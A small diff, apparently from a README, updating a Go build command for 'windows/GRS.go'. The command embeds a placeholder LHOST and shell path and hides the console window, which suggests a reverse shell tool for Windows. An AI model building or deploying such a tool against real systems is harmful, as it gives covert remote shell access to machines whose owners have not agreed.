@@ -6,7 +6,7 @@
 
 Windows:
 
-$ go build -ldflags "-X 'main.host=**LHOST**' -X 'main.shell=**shell path**' -H windowsgui" "windows/GRS.go"
+$ go build -ldflags "-X 'main.host=**LHOST**' -X 'main.shellPath=**shell path**' -H windowsgui" "windows/GRS.go"
 
 
 
